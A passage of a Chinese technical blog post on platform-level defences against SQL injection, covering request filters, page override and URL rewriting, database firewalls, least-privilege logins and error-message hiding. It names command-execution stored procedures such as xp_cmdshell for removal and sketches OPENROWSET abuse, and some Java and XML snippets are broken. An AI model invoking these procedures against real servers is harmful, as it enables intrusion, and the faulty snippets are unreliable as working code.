&lt;p&gt;下面列出了自定义的J2EE Filter类的doFilter方法的示例代码。每个请求/响应对会因为J2EE Web源（JSP文件、servlet等）的请求而调用该方法：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SqlInjDetectionFilter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Filter&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;doFilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ServletRequest&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ServletResponse&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
chain filterchain&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ServletException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//检查请求数据，寻找恶意字符&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;doDetectSqlI&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rep&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//调用链中的下一个过滤器&lt;/span&gt;
chain&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;doFilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;servletRequest&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; servletResponse&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;应用程序过滤器确实适合于运行时（runtime）保护，开发时它们可以独立于应用程序，部署时则可以作为独立的.dll或.jar文件并且能立即激活。&lt;/p&gt;
&lt;h5 id=&#34;使用脚本语言实现过滤器模式&#34;&gt;&lt;a href=&#34;#使用脚本语言实现过滤器模式&#34; class=&#34;headerlink&#34; title=&#34;使用脚本语言实现过滤器模式&#34;&gt;&lt;/a&gt;使用脚本语言实现过滤器模式&lt;/h5&gt;&lt;p&gt;就PHP Web应用而言，可以在php.ini文件中利用auto_prepend_file和auto_append_file配置指令，这些指令指向那些在每个请求的PHP脚本执行之前和之后才执行的PHP文件。添加的逻辑在各种HTTP请求集合（查询字符串、POST、cookie、头等）间循环，必要时可以进行验证和或日志记录。&lt;/p&gt;
&lt;p&gt;另一种用于PHP和经典ASP应用的方法是使用包含文件（include file）。这需要通过在每个应用程序页面添加include指令来修改代码。同样，被包含的逻辑也在各种HTTP请求集合间循环，必要时也可以进行验证和或日志记录。&lt;/p&gt;
&lt;h5 id=&#34;过滤Web服务消息&#34;&gt;&lt;a href=&#34;#过滤Web服务消息&#34; class=&#34;headerlink&#34; title=&#34;过滤Web服务消息&#34;&gt;&lt;/a&gt;过滤Web服务消息&lt;/h5&gt;&lt;p&gt;使用自定义的输入和输出过滤器同样可以很容易地将截断过滤器模式应用于XML Web服务。&lt;/p&gt;
&lt;h4 id=&#34;不可编辑与可编辑的输入保护&#34;&gt;&lt;a href=&#34;#不可编辑与可编辑的输入保护&#34; class=&#34;headerlink&#34; title=&#34;不可编辑与可编辑的输入保护&#34;&gt;&lt;/a&gt;不可编辑与可编辑的输入保护&lt;/h4&gt;&lt;p&gt;输入验证策略，将应用程序的输入分成可编辑的和不可编辑的两类，并且锁定不可编辑的输入以便无法操作它们。不可编辑输入是指最终用户不需要直接修改的输入，比如隐藏表单字段、URI和查询字符串参数、cookie等。该策略隐含的原理是：应用程序应该只允许用户执行用户接口暴露给他们的动作。&lt;/p&gt;
&lt;p&gt;实现这种策略的技术范例是HDIV(HTTP Data Integrity Validator, HTTP数据完整性验证器) 和SPF。&lt;/p&gt;
&lt;h4 id=&#34;URL策略与页面层策略&#34;&gt;&lt;a href=&#34;#URL策略与页面层策略&#34; class=&#34;headerlink&#34; title=&#34;URL策略与页面层策略&#34;&gt;&lt;/a&gt;URL策略与页面层策略&lt;/h4&gt;&lt;p&gt;不修改源代码的前提下，为易受攻击的URL或页面打虚拟补丁的技术。&lt;/p&gt;
&lt;h5 id=&#34;页面覆写-override&#34;&gt;&lt;a href=&#34;#页面覆写-override&#34; class=&#34;headerlink&#34; title=&#34;页面覆写(override)&#34;&gt;&lt;/a&gt;页面覆写(override)&lt;/h5&gt;&lt;p&gt;如果页面易受攻击且需要替换，那么可以创建一个在运行时提交的替代页面或类，通过修改Web应用配置文件中的配置可以实现这种替换。在ASP.NET应用中，则可以使用HTTP handler (处理程序)实现这一任务。&lt;/p&gt;
&lt;p&gt;下面展示了一自定义HTTP handler的配置，它用于处理发送给PageVulnToSqll.aspx页面而非易受攻击页面的请求。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;httpHandlers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;add&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;verb&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token attr-name&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;PageVulnToSqlI.aspx&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;Chapter9.Examples.SecureAspxHandler, Subclass&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token attr-name&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;false&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;httpHandlers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将易受攻击的URL映射到一个通过安全方式处理请求的servlet上&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;servlet&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;servlet-name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;SecureServlet&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;servlet-name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;servlet-class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;chapter9.examples.SecureServletClass&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;servletclass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;servlet&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;servlet-mapping&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!--&amp;lt;servlet-name&amp;gt;ServletVulnToSqli&amp;lt;/servlet-name&amp;gt;--&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;servlet-name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;SecureServlet&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;servlet-name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;url-pattern&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;/ServletVulnToSqli&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;url-pattern&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;servlet-mapping&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;URL重写&#34;&gt;&lt;a href=&#34;#URL重写&#34; class=&#34;headerlink&#34; title=&#34;URL重写&#34;&gt;&lt;/a&gt;URL重写&lt;/h5&gt;&lt;p&gt;URL重写(rewrite)是一种与页面覆写(override)类似的技术。可以通过配置Web服务器或应用框架来接收那些发送给易受攻击页面或URL的请求，并将它们重定向到该页面的替代版本。 页面的新版本通过一种安全的方式来实现原始页面逻辑。&lt;/p&gt;
&lt;h5 id=&#34;资源代理与封装&#34;&gt;&lt;a href=&#34;#资源代理与封装&#34; class=&#34;headerlink&#34; title=&#34;资源代理与封装&#34;&gt;&lt;/a&gt;资源代理与封装&lt;/h5&gt;&lt;p&gt;可以将资源代理与封装和页面覆写或URL重写结合使用，以便将替换页面需要的自定义编码数量降至最低。替代页面在处理重写请求时会循环访问请求参数(查询字符串、POST、 cookie等)并执行必需的验证。&lt;/p&gt;
&lt;h4 id=&#34;面向方面编程&#34;&gt;&lt;a href=&#34;#面向方面编程&#34; class=&#34;headerlink&#34; title=&#34;面向方面编程&#34;&gt;&lt;/a&gt;面向方面编程&lt;/h4&gt;&lt;p&gt;面向方面编程(Aspect-Oriented Programming, AOP)是一种构建可应用到应用程序范围内的通用可重用例程的技术。在开发过程中，它有利于核心应用程序逻辑和通用、重复任务(输入 验证、记录日志、错误处理等)的分离。运行时，可以使用AOP来热补(hot-patch)易受SQL注入攻击的应用程序，也可以无须修改底层源代码就直接将入侵检测和日志审查功能嵌入到应用程序中。&lt;/p&gt;
&lt;h4 id=&#34;应用程序入侵检测系统&#34;&gt;&lt;a href=&#34;#应用程序入侵检测系统&#34; class=&#34;headerlink&#34; title=&#34;应用程序入侵检测系统&#34;&gt;&lt;/a&gt;应用程序入侵检测系统&lt;/h4&gt;&lt;p&gt;可以使用传统的基于网络的入侵检测系统(Intrusion Detection Systems, IDS)来检测SQL注入攻击。&lt;/p&gt;
&lt;p&gt;WAF作为一种非常好的IDS，因为它运行在应用层并且可针对受保护 的应用程序进行微调。&lt;/p&gt;
&lt;p&gt;另一种选择是使用PHPIDS&lt;a href=&#34;http://phpids.org,phpids不会过滤或审查输入,它检测攻击并根据配置来采取措施./&#34;&gt;http://phpids.org，PHPIDS不会过滤或审查输入，它检测攻击并根据配置来采取措施。&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;数据库防火墙&#34;&gt;&lt;a href=&#34;#数据库防火墙&#34; class=&#34;headerlink&#34; title=&#34;数据库防火墙&#34;&gt;&lt;/a&gt;数据库防火墙&lt;/h4&gt;&lt;p&gt;防火墙，它本质上是一种介于应用程序和数据库之间的代理服务器。应用程序连接到数据库防火墙并像正常连接到数据库那样发送查询。 数据库防火墙分析预期的查询，如果认为是安全的，就将它传递给数据库服务器加以执行。反之，如果认为是恶意的，就阻止运行该查询。数据库防火墙还可以通过以被动模式监视连接和向管理员发出可疑行为警告来作为恶意数据库行为的应用层IDS。&lt;/p&gt;
&lt;h3 id=&#34;确保数据库安全&#34;&gt;&lt;a href=&#34;#确保数据库安全&#34; class=&#34;headerlink&#34; title=&#34;确保数据库安全&#34;&gt;&lt;/a&gt;确保数据库安全&lt;/h3&gt;&lt;h4 id=&#34;锁定应用程序数据&#34;&gt;&lt;a href=&#34;#锁定应用程序数据&#34; class=&#34;headerlink&#34; title=&#34;锁定应用程序数据&#34;&gt;&lt;/a&gt;锁定应用程序数据&lt;/h4&gt;&lt;h5 id=&#34;使用较低权限的数据库登录&#34;&gt;&lt;a href=&#34;#使用较低权限的数据库登录&#34; class=&#34;headerlink&#34; title=&#34;使用较低权限的数据库登录&#34;&gt;&lt;/a&gt;使用较低权限的数据库登录&lt;/h5&gt;&lt;p&gt;应用程序连接到数据库服务器的登录语境应该是：拥有的许可权限仅仅只能执行需要的应用程序任务。&lt;/p&gt;
&lt;h5 id=&#34;隔离数据库登录&#34;&gt;&lt;a href=&#34;#隔离数据库登录&#34; class=&#34;headerlink&#34; title=&#34;隔离数据库登录&#34;&gt;&lt;/a&gt;隔离数据库登录&lt;/h5&gt;&lt;p&gt;对于既需要写访问也需要读访问数据库的应用程序，可以使用多个用户登录数据库，这是对使用最小权限登录数据库的扩展。&lt;/p&gt;
&lt;h5 id=&#34;撤销public许可&#34;&gt;&lt;a href=&#34;#撤销public许可&#34; class=&#34;headerlink&#34; title=&#34;撤销public许可&#34;&gt;&lt;/a&gt;撤销public许可&lt;/h5&gt;&lt;p&gt;每种数据库服务器平台均拥有通常称为公共（public）角色的默认角色（所有登录均属于这种角色）。它包含一个默认的许可集，其中包括对系统对象的访问。公共角色还被赋予了执行内置系统存储过程、包和用于管理目的的功能的许可。&lt;/p&gt;
&lt;p&gt;应尽可能多地撤销系统对象的公共角色许可。此外，还必须撤销为自定义数据库对象（比如应用程序使用的表和存储过程）赋予的公共角色的冗余许可，必要时可以为自定义角色分配数据库许可。可以使用这些角色来为特定的用户和组赋予默认的访问级别。&lt;/p&gt;
&lt;h5 id=&#34;使用存储过程&#34;&gt;&lt;a href=&#34;#使用存储过程&#34; class=&#34;headerlink&#34; title=&#34;使用存储过程&#34;&gt;&lt;/a&gt;使用存储过程&lt;/h5&gt;&lt;p&gt;从安全角度看，应该将应用程序的SQL查询封装到存储过程中并且只能为这些对象赋予EXECUTE许可。可以撤销底层对象的所有其他许可，比如SELECT，INSERT等。就SQL注入而言，最低权限的数据库登录（应用程序使用的存储过程只拥有EXECUTE许可）可保证更难 向浏览器返回任意结果集。&lt;/p&gt;
&lt;h5 id=&#34;使用强加密技术来保护存储的敏感数据&#34;&gt;&lt;a href=&#34;#使用强加密技术来保护存储的敏感数据&#34; class=&#34;headerlink&#34; title=&#34;使用强加密技术来保护存储的敏感数据&#34;&gt;&lt;/a&gt;使用强加密技术来保护存储的敏感数据&lt;/h5&gt;&lt;p&gt;要想避免数据库中敏感数据的非授权查看，一种关键的控制就是使用强加密技术。可选的方法包括存储数据的数学哈希（而非数据本身）或者存储使用对称算法加密后的数据。&lt;/p&gt;
&lt;p&gt;如果不需要存储数据本身，那么请考虑一种正确的衍生数学哈希。&lt;/p&gt;
&lt;p&gt;如果必须存储敏感数据，请使用强对称加密算法来进行保护，比如AES（Advanced Encryption Standard,高级加密标准）或三重DES（Data Encryption Standard,数据加密标准）。加密敏感数据的主要挑战是将密钥保存到攻击者无法轻易访问到的位置。&lt;/p&gt;
&lt;h5 id=&#34;维护审查跟踪&#34;&gt;&lt;a href=&#34;#维护审查跟踪&#34; class=&#34;headerlink&#34; title=&#34;维护审查跟踪&#34;&gt;&lt;/a&gt;维护审查跟踪&lt;/h5&gt;&lt;p&gt;维护对应用程序数据库对象的访问审查跟踪非常关键。&lt;/p&gt;
&lt;h5 id=&#34;Oracle错误触发器&#34;&gt;&lt;a href=&#34;#Oracle错误触发器&#34; class=&#34;headerlink&#34; title=&#34;Oracle错误触发器&#34;&gt;&lt;/a&gt;Oracle错误触发器&lt;/h5&gt;&lt;p&gt;Oracle提供了一种名为数据库触发器的特性。当出现特定的事件时，比如使用DDL（数据定义语言，比如DDL触发器）创建对象时，或者出现数据库错误（比如ERROR触发器）时，这些触发器会在数据库范围内激活，从而提供了一种简易的方法来检测SQL注入尝试。&lt;/p&gt;
&lt;h4 id=&#34;锁定数据库服务器&#34;&gt;&lt;a href=&#34;#锁定数据库服务器&#34; class=&#34;headerlink&#34; title=&#34;锁定数据库服务器&#34;&gt;&lt;/a&gt;锁定数据库服务器&lt;/h4&gt;&lt;h5 id=&#34;额外的系统对象锁定&#34;&gt;&lt;a href=&#34;#额外的系统对象锁定&#34; class=&#34;headerlink&#34; title=&#34;额外的系统对象锁定&#34;&gt;&lt;/a&gt;额外的系统对象锁定&lt;/h5&gt;&lt;p&gt;除了撤销系统对象(system object)上的公共对象许可外，请考虑采取额外的步骤来进一步锁定特权对象的访问，比如用于系统管理的对象、执行操作系统命令和产生网络连接的对象。&lt;/p&gt;
&lt;p&gt;请考虑通过以下措施来施加约束：确保未向应用程序角色赋予多余冗余许可、通过服务器配置禁用访问系统范围内的特权对象，或者彻底将这些功能从服务器删除(避免重新启用带来的权限提升)。&lt;/p&gt;
&lt;p&gt;在Oracle中，应该约束运行操作系统的命令以及从数据库访问操作系统级文件的能力。&lt;/p&gt;
&lt;p&gt;在SQL Server中，应该考虑删除危险的存储过程，比如xp_cmdshell以及与xp_reg*、xp_ instancereg*和sp_OA*匹配的存储过程。&lt;/p&gt;
&lt;h5 id=&#34;约束即席查询（ad-hoc-querying）&#34;&gt;&lt;a href=&#34;#约束即席查询（ad-hoc-querying）&#34; class=&#34;headerlink&#34; title=&#34;约束即席查询（ad hoc querying）&#34;&gt;&lt;/a&gt;约束即席查询（ad hoc querying）&lt;/h5&gt;&lt;p&gt;Microsoft SQL Server支持一种名为OPENROWSET的命令来查询远程和本地数据源。远程查询的有用之处在于可利用它来攻击所连网络上的其他数据库服务器。使用这一功能查询本地服务器，攻击者可以在更高特权的SQL Server数据库登录语境中重新向服务器发出验证。&lt;/p&gt;
&lt;p&gt;Oracle支持借助数据库链接（database link）的远程服务器的即席查询。&lt;/p&gt;
&lt;h5 id=&#34;增强对验证周边的控制&#34;&gt;&lt;a href=&#34;#增强对验证周边的控制&#34; class=&#34;headerlink&#34; title=&#34;增强对验证周边的控制&#34;&gt;&lt;/a&gt;增强对验证周边的控制&lt;/h5&gt;&lt;p&gt;应该复查所有数据库登录，禁用或删除不必要的内容，比如默认账户。&lt;/p&gt;
&lt;h5 id=&#34;在最低权限的操作系统账户语境中运行&#34;&gt;&lt;a href=&#34;#在最低权限的操作系统账户语境中运行&#34; class=&#34;headerlink&#34; title=&#34;在最低权限的操作系统账户语境中运行&#34;&gt;&lt;/a&gt;在最低权限的操作系统账户语境中运行&lt;/h5&gt;&lt;p&gt;如果攻击者能够突破数据库服务器语境并获取底层操作系统的访问权，那么此时是否处于最低权限的操作系统账户语境中将非常关键。&lt;/p&gt;
&lt;h5 id=&#34;确保数据库服务器软件打了补丁&#34;&gt;&lt;a href=&#34;#确保数据库服务器软件打了补丁&#34; class=&#34;headerlink&#34; title=&#34;确保数据库服务器软件打了补丁&#34;&gt;&lt;/a&gt;确保数据库服务器软件打了补丁&lt;/h5&gt;&lt;p&gt;使用当前的补丁保证软件更新至最新是一项基本的安全规则&lt;/p&gt;
&lt;p&gt;判定SQL Server/Oracle数据库服务器版本&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;数据库&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;命令&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;版本查阅&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;SQL Server&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;select @@version&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;http://support.microsoft.com/kb/321185&#34;&gt;http://support.microsoft.com/kb/321185&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Oracle&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;– 显示数据库版本 select * from v$version; – 显示已安装组件的版本 select * from dba_registry; – 显示补丁级别 select * from dba_registry_history;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html&#34;&gt;http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;额外的部署考虑&#34;&gt;&lt;a href=&#34;#额外的部署考虑&#34; class=&#34;headerlink&#34; title=&#34;额外的部署考虑&#34;&gt;&lt;/a&gt;额外的部署考虑&lt;/h3&gt;&lt;h4 id=&#34;最小化不必要信息的泄露&#34;&gt;&lt;a href=&#34;#最小化不必要信息的泄露&#34; class=&#34;headerlink&#34; title=&#34;最小化不必要信息的泄露&#34;&gt;&lt;/a&gt;最小化不必要信息的泄露&lt;/h4&gt;&lt;h5 id=&#34;隐藏错误消息&#34;&gt;&lt;a href=&#34;#隐藏错误消息&#34; class=&#34;headerlink&#34; title=&#34;隐藏错误消息&#34;&gt;&lt;/a&gt;隐藏错误消息&lt;/h5&gt;&lt;p&gt;包含描述数据库服务器失败原因信息的错误消息对SQL注入识别和后续的漏洞利用均非常有用。在应用程序级别的错误处理程序中，处理异常和错误消息隐藏会极其有效。好的做法是配置应用框架或Web服务器，以便在产生未预料的应用程序错误（比如包含500状态码的HTTP响应）时返回自定义响应。配置后的响应可以是显示通用消息的自定义错误页面，也可以重定向到默认的Web页面。&lt;/p&gt;
&lt;p&gt;自定义错误的配置技术&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;平   台&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;配置指令&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;ASP.NET Web应用程序&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在 web.config 文件中，将customErrors 设置为 On 或 RemoteOnly  并将defaultRedirect设置为要显示的页面。确保为defaultRedirect配置的页面确实位于配置的位置，这通常容易出错！&lt;br&gt;  &lt;code&gt;&amp;lt;customErrors  mode=&#34;On&#34;  defaultRedirect=&#34;/CustomPage.aspx&#34;&amp;gt;  &amp;lt;/customErrors&amp;gt;&lt;/code&gt;&lt;br&gt;  该配置只适用于ASP.NET资源。当出现任何应用代码无法处理的错误（500、404等）时均会显示该配置页面。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;J2EE Web应用程序&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在web.xml文件中，使用&lt;code&gt;&amp;lt;error-code&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;location&amp;gt;&lt;/code&gt;元素配置&lt;code&gt;&amp;lt;error-page&amp;gt;&lt;/code&gt;元素：&lt;br&gt;&lt;error-page&gt;&lt;br&gt;&lt;error-code&gt;500&lt;/error-code&gt;&lt;br&gt;&lt;location&gt;/CustomPage.html&lt;/location&gt;&lt;br&gt;&lt;/error-page&gt;&lt;br&gt;该配置只适用于专门由Java应用服务器处理的资源。只有当出现500错误时才会显示该配置页面。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;经典ASP/VBScript  Web应用程序&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;必须对IIS进行配置以便隐藏详细的ASP错误消息。可以使用下列操作配置该设置：&lt;br&gt;1. 在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。&lt;br&gt;2.在”Home Directory”选项卡中单击”Configuration”按钮。确保选中了”Send text error message to client”选项，并且该选项下的文本框中存在恰当的消息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;PHP Web应用程序&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在php.ini文件中，设置display_errors为Off。此外，在Web服务器配置中配置默认的错误文档。请参考下面两行表格中针对Apache和 IIS的指令。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Apache Web服务器&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;向指向自定义页面的Apache（位于配置文件内部，通常为httpd.conf） 添加 ErrorDocument 指令：  &lt;code&gt;ErrorDocument 500 /CustomPage.html&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
